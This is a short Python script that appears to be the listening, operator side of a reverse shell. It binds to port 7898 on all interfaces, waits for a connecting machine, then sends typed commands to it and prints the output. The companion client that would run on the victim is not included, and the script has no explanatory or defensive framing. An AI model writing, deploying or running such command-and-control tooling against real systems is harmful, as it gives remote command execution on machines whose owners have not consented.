import socket
import sys
import os


def main():
    ip = "0.0.0.0"
    port = 7898
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    connection.bind((ip,port))
    connection.listen(1)
    conn, addr = connection.accept()
    print("(+) Conecction",addr)

    while True:
        command = input("==>")
        if  command == 'exit':
            conn.send(b'exit')
            conn.close()
            break
        
        elif command == "":
            continue

        else:
            conn.send(command.encode())
            output = conn.recv(1024)
            print(output.decode('latin1'))



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit()